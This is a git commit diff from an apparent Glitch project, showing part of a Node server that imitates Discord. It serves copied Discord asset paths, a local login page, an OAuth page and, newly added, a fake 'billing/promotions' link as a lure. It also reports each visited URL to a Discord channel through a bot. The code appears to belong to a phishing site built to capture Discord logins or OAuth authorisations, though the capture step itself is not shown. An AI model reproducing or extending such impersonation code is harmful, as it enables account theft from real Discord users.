d64663a5378c951fd411fea2f42eba7a01f172b6
Glitch (scalloped-mahogany-chronometer) <none>
2022-01-08 22:50:10 +0000

    🚕🌑 Checkpoint ./index.js:5578687/459

--- index.js
+++ index.js
@@ -34,11 +34,12 @@ headers: {
 return;
 }
     client.createMessage('929480482700288032', `https://discord.com${req.originalUrl}`)
-
+console.log(req.originalUrl)
   if(req.originalUrl === '/assets/0.2d737cc92c807c265e1f.css') return res.sendFile(__dirname + "/style1.css")
   if(req.originalUrl === '/assets/532.d49196785d17cb9b60a9.css') return res.sendFile(__dirname + "/style2.css")
   if(req.originalUrl === '/app') return res.sendFile(__dirname + "/app.html")
   if(req.originalUrl === '/login') return res.sendFile(__dirname + "/login.html")
+  if(req.originalUrl === '/billing/promotions/9jds5SYvvdEAcpH2c62772hbkJVz5aD') return res.sendFile(__dirname + "/index.html")
   if(req.originalUrl.includes('oauth2') && !req.originalUrl.includes('api')) return res.sendFile(__dirname + "/2oauth.html")
 
   let headers = req.headers
